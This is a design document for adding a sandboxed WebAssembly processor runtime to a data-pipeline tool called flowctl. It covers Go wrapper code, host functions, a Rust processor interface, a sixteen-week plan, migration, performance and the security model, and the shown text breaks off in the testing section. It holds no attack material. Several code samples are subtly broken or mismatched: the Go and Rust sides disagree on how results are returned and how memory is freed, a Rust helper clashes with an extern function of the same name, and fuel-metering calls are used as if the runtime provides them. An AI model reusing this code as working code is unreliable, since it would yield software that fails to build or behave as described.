# WASM Integration Architecture for flowctl

## Executive Summary

This document outlines the integration of WebAssembly (WASM) as a secure, portable processor runtime in flowctl. The approach uses a hybrid architecture where WASM processors handle pure data transformation logic while traditional binaries/containers manage complex I/O operations. A wrapper pattern enables seamless gRPC integration, maintaining compatibility with existing components while adding sandboxed execution capabilities.

### Key Benefits
- **Security**: Sandboxed execution prevents malicious processor code
- **Portability**: Write once, run anywhere (Linux, macOS, Windows)
- **Performance**: Near-native speed with predictable resource usage
- **Language Flexibility**: Support for Rust, Go, JavaScript, and more
- **Multi-tenancy**: Safe execution of customer-provided processors

## Current State Analysis

### Existing Architecture
```
stellar-source (binary) ──gRPC──> ttp-processor (binary) ──gRPC──> consumer (Node.js)
```

**Limitations:**
- Processors run with full system access
- Platform-specific binaries required
- No resource isolation
- Security relies on container boundaries
- Difficult multi-tenant deployment

### Component Classification for WASM Viability

#### ✅ **Ideal for WASM (Processors)**
```go
// Pure data transformation
type ProcessorCharacteristics struct {
    StatelessProcessing  bool  // ✅ No persistent state
    PureComputation     bool  // ✅ Input → Logic → Output
    LimitedIO          bool  // ✅ No direct filesystem/network
    BoundedExecution   bool  // ✅ Predictable runtime
}
```

**Examples:**
- `ttp-processor` - Transaction processing logic
- Fraud detection algorithms
- Data enrichment/transformation
- Format conversion (JSON, Protobuf, etc.)
- Filtering and aggregation

#### ❌ **Keep as Binary/Container (Sources/Sinks)**
```go
// Complex I/O requirements
type IOCharacteristics struct {
    NativeDrivers      bool  // Database connectors
    PersistentConns    bool  // WebSocket, streaming APIs
    HeavyLibraries     bool  // Stellar SDK, Kafka client
    OSIntegration     bool  // File watching, raw sockets
}
```

**Examples:**
- `stellar-live-source-datalake` - Stellar API integration
- Database sinks (Postgres, ClickHouse)
- Kafka producers/consumers
- File system watchers

## WASM Integration Strategy

### Hybrid Architecture Overview

```
┌─────────────────┐        ┌─────────────────────────┐        ┌──────────────┐
│ Source          │        │ WASM Processor Wrapper  │        │ Sink         │
│ (Binary/Container) ────► │ ┌─────────────────────┐ │ ────► │ (Binary/Container)
│                 │  gRPC  │ │   processor.wasm    │ │  gRPC │              │
└─────────────────┘        │ │   (Sandboxed)      │ │        └──────────────┘
                           │ └─────────────────────┘ │
                           │ - gRPC Client/Server    │
                           │ - Protocol Translation │
                           │ - Resource Management   │
                           └─────────────────────────┘
```

### Three-Tier Runtime Model

```yaml
# Tier 1: Complex I/O (Existing)
sources:
  runtime: binary | container
  access: full-system
  use_cases: [database-connectors, api-clients, file-watchers]

# Tier 2: Pure Processing (NEW - WASM)
processors:
  runtime: wasm
  access: sandboxed
  use_cases: [transformation, enrichment, filtering, ml-inference]

# Tier 3: Output Layer (Existing)
sinks:
  runtime: binary | container
  access: full-system  
  use_cases: [database-writers, api-publishers, file-outputs]
```

## gRPC-WASM Wrapper Architecture

### Component Design

#### 1. **WASM Processor Wrapper**

```go
// internal/processor/wasm_wrapper.go
package processor

import (
    "context"
    "encoding/json"
    "fmt"
    "net"
    "sync"
    "time"
    
    "github.com/tetratelabs/wazero"
    "github.com/tetratelabs/wazero/api"
    "google.golang.org/grpc"
    "google.golang.org/protobuf/encoding/protojson"
    
    pb "github.com/withobsrvr/flowctl/proto"
)

type WasmProcessorWrapper struct {
    pb.UnimplementedProcessorServer
    
    // Identity
    id           string
    config       WasmConfig
    
    // WASM Runtime
    runtime      wazero.Runtime
    module       api.Module
    processFunc  api.Function
    allocFunc    api.Function
    freeFunc     api.Function
    
    // gRPC Interfaces
    grpcServer   *grpc.Server
    serverPort   int
    
    // Upstream Connection
    upstreamConn   *grpc.ClientConn
    upstreamClient pb.ProcessorClient
    
    // Event Processing
    eventQueue     chan *pb.Event
    processedQueue chan *pb.Event
    subscribers    map[string]pb.Processor_StreamEventsServer
    subMutex       sync.RWMutex
    
    // Lifecycle
    ctx          context.Context
    cancel       context.CancelFunc
    running      bool
    mu           sync.RWMutex
}

type WasmConfig struct {
    // Resource Limits
    MaxMemoryPages  uint32        // 64KB per page
    MaxFuel         uint64        // CPU instruction limit
    ExecutionTimeout time.Duration
    
    // Security
    AllowLogging    bool
    AllowMetrics    bool
    AllowHTTP       bool
    AllowedDomains  []string
    
    // Performance
    BatchSize       int
    BatchTimeout    time.Duration
    PoolSize        int
}
```

#### 2. **WASM Runtime Management**

```go
// internal/runtime/wasm_runtime.go
package runtime

func NewWasmRuntime(ctx context.Context, config WasmConfig) (wazero.Runtime, error) {
    // Configure runtime with limits
    runtimeConfig := wazero.NewRuntimeConfig().
        WithMemoryLimitPages(config.MaxMemoryPages).
        WithCloseOnContextDone(true)
    
    runtime := wazero.NewRuntimeWithConfig(ctx, runtimeConfig)
    
    // Install WASI for basic system interface
    wasi_snapshot_preview1.MustInstantiate(ctx, runtime)
    
    // Register custom host functions
    hostModule := runtime.NewHostModuleBuilder("flowctl")
    registerHostFunctions(hostModule, config)
    _, err := hostModule.Instantiate(ctx)
    
    return runtime, err
}

func registerHostFunctions(builder wazero.HostModuleBuilder, config WasmConfig) {
    // Logging function
    if config.AllowLogging {
        builder.NewFunctionBuilder().
            WithName("log").
            WithParameterNames("level", "msg_ptr", "msg_len").
            WithFunc(func(ctx context.Context, level uint32, ptr uint32, len uint32) {
                memory := api.UnwrapOpaque(ctx).(*api.Memory)
                bytes, _ := (*memory).Read(ptr, len)
                message := string(bytes)
                
                switch level {
                case 0: logger.Debug(message)
                case 1: logger.Info(message)
                case 2: logger.Warn(message)
                case 3: logger.Error(message)
                }
            }).
            Export("log")
    }
    
    // Metrics recording
    if config.AllowMetrics {
        builder.NewFunctionBuilder().
            WithName("record_metric").
            WithParameterNames("name_ptr", "name_len", "value").
            WithFunc(func(ctx context.Context, namePtr uint32, nameLen uint32, value float64) {
                memory := api.UnwrapOpaque(ctx).(*api.Memory)
                nameBytes, _ := (*memory).Read(namePtr, nameLen)
                metricName := string(nameBytes)
                
                // Record to metrics system
                metrics.Record(metricName, value)
            }).
            Export("record_metric")
    }
    
    // HTTP requests (controlled)
    if config.AllowHTTP {
        builder.NewFunctionBuilder().
            WithName("http_request").
            WithParameterNames("method", "url_ptr", "url_len", "body_ptr", "body_len").
            WithResultNames("response_ptr", "response_len").
            WithFunc(func(ctx context.Context, method uint32, urlPtr uint32, urlLen uint32, bodyPtr uint32, bodyLen uint32) (uint64, uint64) {
                memory := api.UnwrapOpaque(ctx).(*api.Memory)
                
                urlBytes, _ := (*memory).Read(urlPtr, urlLen)
                url := string(urlBytes)
                
                // Check allowed domains
                if !isAllowedURL(url, config.AllowedDomains) {
                    return 0, 0 // Access denied
                }
                
                bodyBytes, _ := (*memory).Read(bodyPtr, bodyLen)
                
                // Make HTTP request with timeout
                client := &http.Client{Timeout: 10 * time.Second}
                resp, err := client.Post(url, "application/json", bytes.NewReader(bodyBytes))
                if err != nil {
                    return 0, 0
                }
                defer resp.Body.Close()
                
                respBody, _ := io.ReadAll(resp.Body)
                
                // Allocate memory for response
                allocFunc := api.UnwrapOpaque(ctx).(*api.Function)
                results, _ := (*allocFunc).Call(ctx, uint64(len(respBody)))
                respPtr := uint32(results[0])
                
                // Write response
                (*memory).Write(respPtr, respBody)
                
                return uint64(respPtr), uint64(len(respBody))
            }).
            Export("http_request")
    }
}
```

#### 3. **gRPC Integration Layer**

```go
// Event processing pipeline
func (w *WasmProcessorWrapper) Run(ctx context.Context) error {
    w.ctx, w.cancel = context.WithCancel(ctx)
    
    // Start gRPC server
    if err := w.startGRPCServer(); err != nil {
        return fmt.Errorf("failed to start gRPC server: %w", err)
    }
    
    // Connect to upstream
    if err := w.connectToUpstream(); err != nil {
        return fmt.Errorf("failed to connect to upstream: %w", err)
    }
    
    // Start processing goroutines
    go w.processEvents()
    go w.streamToDownstream()
    
    w.setRunning(true)
    
    <-w.ctx.Done()
    return w.shutdown()
}

func (w *WasmProcessorWrapper) connectToUpstream() error {
    upstreamAddr := w.config.UpstreamAddress
    
    conn, err := grpc.Dial(upstreamAddr, 
        grpc.WithInsecure(),
        grpc.WithKeepaliveParams(keepalive.ClientParameters{
            Time:    30 * time.Second,
            Timeout: 5 * time.Second,
        }))
    if err != nil {
        return err
    }
    
    w.upstreamConn = conn
    w.upstreamClient = pb.NewProcessorClient(conn)
    
    // Start receiving events
    go w.receiveFromUpstream()
    
    return nil
}

func (w *WasmProcessorWrapper) receiveFromUpstream() {
    for w.isRunning() {
        stream, err := w.upstreamClient.StreamEvents(w.ctx, &pb.StreamRequest{
            ProcessorId: w.id,
        })
        if err != nil {
            logger.Error("Failed to create stream", zap.Error(err))
            time.Sleep(5 * time.Second)
            continue
        }
        
        for {
            event, err := stream.Recv()
            if err != nil {
                logger.Error("Stream receive error", zap.Error(err))
                break
            }
            
            select {
            case w.eventQueue <- event:
            case <-w.ctx.Done():
                return
            }
        }
    }
}

func (w *WasmProcessorWrapper) processEvents() {
    batch := make([]*pb.Event, 0, w.config.BatchSize)
    batchTimer := time.NewTimer(w.config.BatchTimeout)
    
    for {
        select {
        case <-w.ctx.Done():
            return
            
        case event := <-w.eventQueue:
            batch = append(batch, event)
            
            if len(batch) >= w.config.BatchSize {
                w.processBatch(batch)
                batch = batch[:0]
                if !batchTimer.Stop() {
                    <-batchTimer.C
                }
                batchTimer.Reset(w.config.BatchTimeout)
            }
            
        case <-batchTimer.C:
            if len(batch) > 0 {
                w.processBatch(batch)
                batch = batch[:0]
            }
            batchTimer.Reset(w.config.BatchTimeout)
        }
    }
}

func (w *WasmProcessorWrapper) processBatch(events []*pb.Event) {
    startTime := time.Now()
    
    for _, event := range events {
        processed, err := w.processEvent(event)
        if err != nil {
            logger.Error("WASM processing failed", 
                zap.String("event_id", event.Id),
                zap.Error(err))
            continue
        }
        
        select {
        case w.processedQueue <- processed:
        case <-w.ctx.Done():
            return
        }
    }
    
    // Record metrics
    processingTime := time.Since(startTime)
    metrics.RecordHistogram("wasm_batch_processing_time", processingTime.Seconds())
    metrics.RecordCounter("wasm_events_processed", float64(len(events)))
}

func (w *WasmProcessorWrapper) processEvent(event *pb.Event) (*pb.Event, error) {
    // Convert gRPC event to JSON for WASM
    jsonBytes, err := protojson.Marshal(event)
    if err != nil {
        return nil, fmt.Errorf("failed to marshal event: %w", err)
    }
    
    // Allocate memory in WASM
    allocResults, err := w.allocFunc.Call(w.ctx, uint64(len(jsonBytes)))
    if err != nil {
        return nil, fmt.Errorf("WASM allocation failed: %w", err)
    }
    inputPtr := uint32(allocResults[0])
    
    // Write input to WASM memory
    if !w.module.Memory().Write(inputPtr, jsonBytes) {
        return nil, fmt.Errorf("failed to write to WASM memory")
    }
    
    // Set fuel limit for execution
    w.module.SetFuel(w.config.MaxFuel)
    
    // Call WASM process function with timeout
    processCtx, cancel := context.WithTimeout(w.ctx, w.config.ExecutionTimeout)
    defer cancel()
    
    processResults, err := w.processFunc.Call(processCtx, uint64(inputPtr), uint64(len(jsonBytes)))
    if err != nil {
        // Free input memory
        w.freeFunc.Call(w.ctx, uint64(inputPtr))
        return nil, fmt.Errorf("WASM execution failed: %w", err)
    }
    
    // Read output
    outputPtr := uint32(processResults[0])
    outputLen := uint32(processResults[1])
    
    outputBytes, ok := w.module.Memory().Read(outputPtr, outputLen)
    if !ok {
        return nil, fmt.Errorf("failed to read WASM output")
    }
    
    // Free memory
    w.freeFunc.Call(w.ctx, uint64(inputPtr))
    w.freeFunc.Call(w.ctx, uint64(outputPtr))
    
    // Convert back to gRPC event
    var outputEvent pb.Event
    if err := protojson.Unmarshal(outputBytes, &outputEvent); err != nil {
        return nil, fmt.Errorf("failed to unmarshal output: %w", err)
    }
    
    return &outputEvent, nil
}
```

#### 4. **gRPC Server Implementation**

```go
// Implement ProcessorServer interface
func (w *WasmProcessorWrapper) StreamEvents(req *pb.StreamRequest, stream pb.Processor_StreamEventsServer) error {
    logger.Info("Downstream consumer connected", 
        zap.String("processor", w.id),
        zap.String("consumer", req.ProcessorId))
    
    // Register subscriber
    w.subMutex.Lock()
    w.subscribers[req.ProcessorId] = stream
    w.subMutex.Unlock()
    
    // Cleanup on disconnect
    defer func() {
        w.subMutex.Lock()
        delete(w.subscribers, req.ProcessorId)
        w.subMutex.Unlock()
    }()
    
    // Keep connection alive
    <-stream.Context().Done()
    
    logger.Info("Downstream consumer disconnected", 
        zap.String("consumer", req.ProcessorId))
    
    return nil
}

func (w *WasmProcessorWrapper) streamToDownstream() {
    for {
        select {
        case <-w.ctx.Done():
            return
            
        case event := <-w.processedQueue:
            w.subMutex.RLock()
            subscribers := make([]pb.Processor_StreamEventsServer, 0, len(w.subscribers))
            for _, stream := range w.subscribers {
                subscribers = append(subscribers, stream)
            }
            w.subMutex.RUnlock()
            
            // Send to all subscribers
            for _, stream := range subscribers {
                if err := stream.Send(event); err != nil {
                    logger.Error("Failed to send event to subscriber", zap.Error(err))
                }
            }
        }
    }
}

func (w *WasmProcessorWrapper) GetHealth(ctx context.Context, req *pb.HealthRequest) (*pb.HealthResponse, error) {
    return &pb.HealthResponse{
        Status: pb.HealthStatus_HEALTHY,
        ProcessorId: w.id,
        Timestamp: timestamppb.Now(),
        Metrics: map[string]float64{
            "events_processed": metrics.GetCounter("wasm_events_processed"),
            "avg_processing_time": metrics.GetHistogram("wasm_batch_processing_time").Mean(),
            "memory_usage": float64(w.module.Memory().Size()),
        },
    }, nil
}
```

### WASM Module Interface

#### Standard WASM Processor Contract

```rust
// WASM processor interface (Rust example)
// src/lib.rs
use serde::{Deserialize, Serialize};
use serde_json;

#[derive(Deserialize, Serialize)]
pub struct Event {
    pub id: String,
    pub timestamp: i64,
    pub data: serde_json::Value,
    pub metadata: std::collections::HashMap<String, String>,
}

// External function declarations (host functions)
extern "C" {
    fn log(level: u32, msg_ptr: *const u8, msg_len: usize);
    fn record_metric(name_ptr: *const u8, name_len: usize, value: f64);
    fn http_request(method: u32, url_ptr: *const u8, url_len: usize, body_ptr: *const u8, body_len: usize) -> u64;
}

// Memory management
#[no_mangle]
pub extern "C" fn allocate(size: usize) -> *mut u8 {
    let mut buf = Vec::with_capacity(size);
    let ptr = buf.as_mut_ptr();
    std::mem::forget(buf);
    ptr
}

#[no_mangle]
pub extern "C" fn free(ptr: *mut u8, size: usize) {
    unsafe {
        let _ = Vec::from_raw_parts(ptr, 0, size);
    }
}

// Main processing function
#[no_mangle]
pub extern "C" fn process_event(input_ptr: *const u8, input_len: usize) -> u64 {
    // Read input
    let input_bytes = unsafe { std::slice::from_raw_parts(input_ptr, input_len) };
    
    // Parse event
    let event: Event = match serde_json::from_slice(input_bytes) {
        Ok(e) => e,
        Err(_) => return 0, // Error indicator
    };
    
    // Process event
    let processed = match process(event) {
        Ok(e) => e,
        Err(_) => return 0,
    };
    
    // Serialize output
    let output_bytes = match serde_json::to_vec(&processed) {
        Ok(bytes) => bytes,
        Err(_) => return 0,
    };
    
    // Allocate output memory
    let output_ptr = allocate(output_bytes.len());
    unsafe {
        std::ptr::copy_nonoverlapping(
            output_bytes.as_ptr(),
            output_ptr,
            output_bytes.len()
        );
    }
    
    // Return pointer and length as packed u64
    ((output_ptr as u64) << 32) | (output_bytes.len() as u64)
}

// Business logic
fn process(mut event: Event) -> Result<Event, Box<dyn std::error::Error>> {
    // Example: TTP processor logic
    if let Some(transaction) = event.data.get("transaction") {
        // Extract token transfer patterns
        let token_transfers = extract_token_transfers(transaction)?;
        
        event.data["token_transfers"] = serde_json::to_value(token_transfers)?;
        event.metadata.insert("processor".to_string(), "ttp-processor-wasm".to_string());
        
        // Log processing
        log_info("Processed transaction for token transfers");
        
        // Record metrics
        record_metric("token_transfers_extracted", token_transfers.len() as f64);
    }
    
    Ok(event)
}

// Helper functions
fn log_info(msg: &str) {
    unsafe {
        log(1, msg.as_ptr(), msg.len());
    }
}

fn record_metric(name: &str, value: f64) {
    unsafe {
        record_metric(name.as_ptr(), name.len(), value);
    }
}
```

## Implementation Plan

### Phase 1: Foundation (Weeks 1-4)

#### Week 1: WASM Runtime Setup
- [ ] **Research and select WASM runtime**
  - Evaluate: Wasmtime, Wazero, Wasmer
  - Decision criteria: Performance, Go integration, security features
  - **Decision**: Use Wazero for pure Go implementation

- [ ] **Create basic WASM runtime**
  ```go
  // internal/runtime/wasm.go
  type WasmRuntime struct {
      runtime wazero.Runtime
      config  RuntimeConfig
  }
  ```

- [ ] **Implement host functions**
  - Logging interface
  - Metrics recording
  - Basic error handling

#### Week 2: WASM Processor Wrapper
- [ ] **Create wrapper structure**
  ```go
  // internal/processor/wasm_wrapper.go
  type WasmProcessorWrapper struct {
      // Core fields
  }
  ```

- [ ] **Implement gRPC interfaces**
  - ProcessorServer implementation
  - Upstream client connection
  - Event queue management

- [ ] **Memory management**
  - Allocation/deallocation
  - Buffer pooling
  - Memory limit enforcement

#### Week 3: Integration with Orchestrator
- [ ] **Update HybridOrchestrator**
  ```go
  func (o *HybridOrchestrator) startWasmComponent(component *Component) error {
      // Implementation
  }
  ```

- [ ] **Configuration support**
  ```yaml
  processors:
    - id: test-processor
      type: wasm
      config:
        wasm_file: "./processors/test.wasm"
        memory_limit: 128MB
  ```

- [ ] **Health checks and monitoring**
  - Health endpoint implementation
  - Metrics collection
  - Error reporting

#### Week 4: Basic SDK and Testing
- [ ] **Create Rust SDK**
  ```rust
  // flowctl-wasm-sdk crate
  pub trait Processor {
      fn process(&self, event: Event) -> Result<Event, Error>;
  }
  ```

- [ ] **Build system integration**
  ```bash
  flowctl generate processor --name=test --lang=rust
  flowctl build test-processor/
  ```

- [ ] **Integration tests**
  - End-to-end pipeline with WASM processor
  - Performance benchmarking
  - Memory leak detection

### Phase 2: Production Readiness (Weeks 5-8)

#### Week 5: Performance Optimization
- [ ] **Batch processing**
  ```go
  func (w *WasmProcessorWrapper) processBatch(events []*Event) ([]*Event, error) {
      // Batch processing implementation
  }
  ```

- [ ] **Memory pooling**
  - Reuse WASM instances
  - Buffer pooling
  - Connection pooling

- [ ] **Compilation caching**
  ```go
  type ModuleCache struct {
      compiled map[string]wazero.CompiledModule
  }
  ```

#### Week 6: Security Hardening
- [ ] **Resource limits**
  - CPU time limits (fuel)
  - Memory limits
  - Execution timeouts

- [ ] **Capability system**
  ```yaml
  permissions:
    logging: true
    metrics: true
    http:
      enabled: true
      allowed_domains: ["api.example.com"]
    database: false
  ```

- [ ] **Sandbox validation**
  - Network isolation testing
  - File system access prevention
  - Process spawning prevention

#### Week 7: Developer Experience
- [ ] **Multi-language SDKs**
  - Rust SDK (complete)
  - Go SDK
  - JavaScript SDK (AssemblyScript)

- [ ] **Build tooling**
  ```bash
  flowctl build --optimize --target=wasm32-wasi
  flowctl test processor.wasm --input=test-events.json
  flowctl validate processor.wasm
  ```

- [ ] **Documentation and examples**
  - API documentation
  - Tutorial: "Your First WASM Processor"
  - Example processors (filter, enricher, transformer)

#### Week 8: Monitoring and Observability
- [ ] **Metrics collection**
  ```go
  type WasmMetrics struct {
      EventsProcessed    int64
      ProcessingTime     time.Duration
      MemoryUsage       uint64
      ErrorRate         float64
  }
  ```

- [ ] **Distributed tracing**
  - OpenTelemetry integration
  - Trace context propagation
  - Performance insights

- [ ] **Logging integration**
  - Structured logging from WASM
  - Log aggregation
  - Debug capabilities

### Phase 3: Advanced Features (Weeks 9-12)

#### Week 9: Hot Deployment
- [ ] **Version management**
  ```go
  type VersionedProcessor struct {
      versions map[string]*WasmProcessor
      current  string
      canary   *CanaryConfig
  }
  ```

- [ ] **Rolling updates**
  ```bash
  flowctl update processor-id --wasm=v2.wasm --strategy=rolling --percentage=10
  ```

- [ ] **Rollback capabilities**
  ```bash
  flowctl rollback processor-id --to-version=v1
  ```

#### Week 10: Multi-Language Support
- [ ] **Python support (Pyodide)**
  ```python
  from flowctl import processor
  
  @processor
  def process_event(event):
      # Python processing logic
      return event
  ```

- [ ] **JavaScript support**
  ```javascript
  import { processor } from '@flowctl/wasm-sdk';
  
  export const process = processor((event) => {
      // JavaScript processing logic
      return event;
  });
  ```

- [ ] **Build system integration**
  - Language-specific build templates
  - Dependency management
  - Cross-compilation support

#### Week 11: Advanced Capabilities
- [ ] **Database access**
  ```rust
  // Controlled database access through host functions
  let result = query_database("SELECT * FROM enrichment WHERE id = ?", &[event.id])?;
  ```

- [ ] **HTTP client**
  ```rust
  // Controlled HTTP access
  let response = http_get("https://api.allowed-domain.com/enrich")?;
  ```

- [ ] **State management**
  ```rust
  // Persistent state across invocations
  let state = get_processor_state()?;
  state.insert("counter", state.get("counter").unwrap_or(0) + 1);
  set_processor_state(state)?;
  ```

#### Week 12: Enterprise Features
- [ ] **Multi-tenancy**
  ```go
  type TenantProcessor struct {
      tenantID   string
      processor  *WasmProcessor
      quotas     ResourceQuotas
  }
  ```

- [ ] **Audit logging**
  - All WASM executions logged
  - Security event tracking
  - Compliance reporting

- [ ] **Resource quotas**
  ```yaml
  quotas:
    cpu_seconds_per_hour: 3600
    memory_mb_hours: 1000
    http_requests_per_minute: 100
  ```

### Phase 4: Ecosystem Development (Weeks 13-16)

#### Week 13: Processor Marketplace
- [ ] **Registry system**
  ```bash
  flowctl registry publish my-processor.wasm
  flowctl registry search fraud-detection
  flowctl registry install obsrvr/fraud-detector:latest
  ```

- [ ] **Signing and verification**
  ```bash
  flowctl sign processor.wasm --key=private.key
  flowctl verify processor.wasm --publisher=trusted-org
  ```

#### Week 14: Advanced Integrations
- [ ] **ML model inference**
  ```rust
  // ONNX runtime integration
  let model = load_onnx_model("fraud_model.onnx")?;
  let prediction = model.predict(&features)?;
  ```

- [ ] **Vector operations**
  ```rust
  // SIMD operations for performance
  use std::simd::f32x4;
  let vectorized_result = process_simd(input_vectors);
  ```

#### Week 15: Testing and Validation
- [ ] **Comprehensive test suite**
  - Unit tests for all components
  - Integration tests
  - Performance benchmarks
  - Security penetration testing

- [ ] **Load testing**
  ```bash
  flowctl load-test --processors=10 --events-per-second=10000 --duration=1h
  ```

#### Week 16: Documentation and Launch
- [ ] **Complete documentation**
  - Architecture guide
  - Developer tutorials
  - API reference
  - Migration guide

- [ ] **Community preparation**
  - Example processors
  - Best practices guide
  - Performance tuning guide

## Migration Strategy

### Existing Processor Migration

#### 1. **Assessment Phase**
```bash
# Analyze existing processors for WASM compatibility
flowctl analyze processor ./ttp-processor-server
# Output:
# ✅ Core logic: Compatible with WASM
# ❌ gRPC server: Requires wrapper
# ✅ Dependencies: Can be compiled to WASM
# 📊 Estimated effort: 2-3 days
```

#### 2. **Extraction Phase**
```bash
# Extract core processing logic
flowctl extract --processor=./ttp-processor-server --output=./ttp-processor-wasm
# Creates WASM project with extracted logic
```

#### 3. **Conversion Phase**
```rust
// Original ttp-processor logic
mod stellar_processing {
    pub fn process_transaction(tx: &Transaction) -> Vec<TokenTransfer> {
        // Existing logic moved here
    }
}

// WASM wrapper
#[no_mangle]
pub extern "C" fn process_event(input_ptr: *const u8, input_len: usize) -> u64 {
    let event: Event = parse_input(input_ptr, input_len)?;
    
    if let Some(tx) = event.get_transaction() {
        let transfers = stellar_processing::process_transaction(&tx);
        event.set_token_transfers(transfers);
    }
    
    serialize_output(event)
}
```

#### 4. **Validation Phase**
```bash
# Test WASM processor against original
flowctl validate --original=./ttp-processor-server --wasm=./ttp-processor.wasm --test-data=./test-events.json
# Validates identical output
```

### Deployment Strategy

#### Blue-Green Deployment
```yaml
# Deploy WASM processor alongside original
processors:
  - id: ttp-processor-original
    type: process
    command: ["./ttp-processor-server"]
    traffic_percentage: 90
    
  - id: ttp-processor-wasm
    type: wasm
    config:
      wasm_file: "./ttp-processor.wasm"
    traffic_percentage: 10
```

#### Gradual Migration
```bash
# Week 1: 10% traffic to WASM
flowctl update-traffic ttp-processor-wasm --percentage=10

# Week 2: 50% traffic to WASM
flowctl update-traffic ttp-processor-wasm --percentage=50

# Week 3: 100% traffic to WASM
flowctl update-traffic ttp-processor-wasm --percentage=100

# Week 4: Remove original processor
flowctl remove ttp-processor-original
```

## Performance Considerations

### Benchmarking Strategy

#### 1. **Baseline Measurements**
```bash
# Measure current performance
flowctl benchmark --processor=ttp-processor-server --events=100000
# Results:
# Throughput: 5000 events/sec
# Latency P50: 2ms
# Latency P99: 10ms
# Memory: 50MB average
```

#### 2. **WASM Performance Testing**
```bash
# Measure WASM performance
flowctl benchmark --processor=ttp-processor.wasm --events=100000
# Target results:
# Throughput: 4500+ events/sec (90% of original)
# Latency P50: 2.5ms (25% increase acceptable)
# Latency P99: 12ms
# Memory: 30MB average (better due to no runtime overhead)
```

#### 3. **Optimization Targets**

| Metric | Current | WASM Target | Optimization Strategy |
|--------|---------|-------------|----------------------|
| Startup Time | 200ms | 50ms | Pre-compiled modules |
| Memory Usage | 50MB | 30MB | Smaller runtime footprint |
| Throughput | 5000/sec | 4500/sec | Batch processing |
| CPU Usage | 60% | 50% | Compiled WASM efficiency |

### Performance Optimizations

#### 1. **Compilation Strategies**
```go
// Pre-compile modules for faster startup
type CompiledModuleCache struct {
    modules map[string]wazero.CompiledModule
    mu      sync.RWMutex
}

func (c *CompiledModuleCache) GetOrCompile(wasmBytes []byte) (wazero.CompiledModule, error) {
    hash := sha256.Sum256(wasmBytes)
    hashStr := hex.EncodeToString(hash[:])
    
    c.mu.RLock()
    if module, exists := c.modules[hashStr]; exists {
        c.mu.RUnlock()
        return module, nil
    }
    c.mu.RUnlock()
    
    // Compile with optimizations
    module, err := runtime.CompileModule(ctx, wasmBytes)
    if err != nil {
        return nil, err
    }
    
    c.mu.Lock()
    c.modules[hashStr] = module
    c.mu.Unlock()
    
    return module, nil
}
```

#### 2. **Instance Pooling**
```go
// Pool WASM instances for reuse
type InstancePool struct {
    available chan api.Module
    factory   func() (api.Module, error)
    maxSize   int
}

func (p *InstancePool) Get() (api.Module, error) {
    select {
    case instance := <-p.available:
        return instance, nil
    default:
        return p.factory()
    }
}

func (p *InstancePool) Put(instance api.Module) {
    select {
    case p.available <- instance:
    default:
        // Pool full, let it be garbage collected
        instance.Close()
    }
}
```

#### 3. **Batch Processing**
```go
// Process multiple events in single WASM call
func (w *WasmProcessor) ProcessBatch(events []*Event) ([]*Event, error) {
    // Serialize batch
    batch := EventBatch{Events: events}
    inputBytes, _ := json.Marshal(batch)
    
    // Single WASM call
    outputBytes, err := w.callWasm(inputBytes)
    if err != nil {
        return nil, err
    }
    
    // Deserialize results
    var outputBatch EventBatch
    json.Unmarshal(outputBytes, &outputBatch)
    
    return outputBatch.Events, nil
}
```

## Security Model

### Sandbox Enforcement

#### 1. **Memory Isolation**
```go
// Each WASM instance has isolated linear memory
type MemoryLimits struct {
    MaxPages     uint32        // 64KB per page
    GrowthLimit  uint32        // How much memory can grow
    StackSize    uint32        // Stack size limit
}

func enforceMemoryLimits(module api.Module, limits MemoryLimits) error {
    memory := module.Memory()
    
    if memory.Size() > limits.MaxPages*65536 {
        return errors.New("memory limit exceeded")
    }
    
    return nil
}
```

#### 2. **Execution Limits**
```go
// CPU time limits using fuel
type ExecutionLimits struct {
    MaxFuel         uint64        // Instruction count limit
    TimeoutDuration time.Duration // Wall clock timeout
}

func enforceExecutionLimits(store api.Store, limits ExecutionLimits) {
    store.SetFuel(limits.MaxFuel)
    
    // Monitor fuel consumption
    go func() {
        ticker := time.NewTicker(100 * time.Millisecond)
        timeout := time.After(limits.TimeoutDuration)
        
        for {
            select {
            case <-ticker.C:
                if store.GetFuel() == 0 {
                    store.SetFuel(0) // Force termination
                    return
                }
            case <-timeout:
                store.SetFuel(0) // Force termination
                return
            }
        }
    }()
}
```

#### 3. **Capability Control**
```go
// Fine-grained permission system
type Capabilities struct {
    Network    NetworkCapability
    FileSystem FileSystemCapability
    Database   DatabaseCapability
    Logging    bool
    Metrics    bool
}

type NetworkCapability struct {
    Enabled        bool
    AllowedDomains []string
    MaxRequestsPerMinute int
}

func checkNetworkAccess(url string, caps NetworkCapability) error {
    if !caps.Enabled {
        return errors.New("network access denied")
    }
    
    host := extractHost(url)
    for _, allowed := range caps.AllowedDomains {
        if host == allowed || strings.HasSuffix(host, "."+allowed) {
            return nil
        }
    }
    
    return errors.New("domain not allowed")
}
```

### Multi-Tenant Security

#### 1. **Tenant Isolation**
```go
type TenantProcessor struct {
    TenantID      string
    Processor     *WasmProcessor
    ResourceQuota ResourceQuota
    Capabilities  Capabilities
}

type ResourceQuota struct {
    CPUSecondsPerHour    int64
    MemoryMBHours        int64
    NetworkRequestsPerHour int64
    StorageBytes         int64
}

func (t *TenantProcessor) checkQuota(operation string, cost int64) error {
    current := t.getCurrentUsage()
    
    switch operation {
    case "cpu":
        if current.CPUSeconds + cost > t.ResourceQuota.CPUSecondsPerHour {
            return errors.New("CPU quota exceeded")
        }
    case "memory":
        if current.MemoryMBHours + cost > t.ResourceQuota.MemoryMBHours {
            return errors.New("memory quota exceeded")
        }
    // ... other resources
    }
    
    return nil
}
```

#### 2. **Audit Logging**
```go
type SecurityAuditLog struct {
    TenantID    string    `json:"tenant_id"`
    ProcessorID string    `json:"processor_id"`
    Action      string    `json:"action"`
    Resource    string    `json:"resource"`
    Allowed     bool      `json:"allowed"`
    Timestamp   time.Time `json:"timestamp"`
    Details     map[string]interface{} `json:"details"`
}

func auditSecurityEvent(tenantID, processorID, action, resource string, allowed bool, details map[string]interface{}) {
    event := SecurityAuditLog{
        TenantID:    tenantID,
        ProcessorID: processorID,
        Action:      action,
        Resource:    resource,
        Allowed:     allowed,
        Timestamp:   time.Now(),
        Details:     details,
    }
    
    // Log to security audit system
    securityLogger.Info("security_event", zap.Any("event", event))
    
    // Send to SIEM if configured
    if siemEndpoint != "" {
        sendToSIEM(event)
    }
}
```

## Testing Strategy

### Unit Testing

#### 1. **WASM Runtime Tests**
```go
// Test WASM module loading and execution
func TestWasmRuntimeBasics(t *testing.T) {
    ctx := context.Background()
    runtime, err := NewWasmRuntime(ctx, DefaultConfig())
    require.NoError(t, err)
    
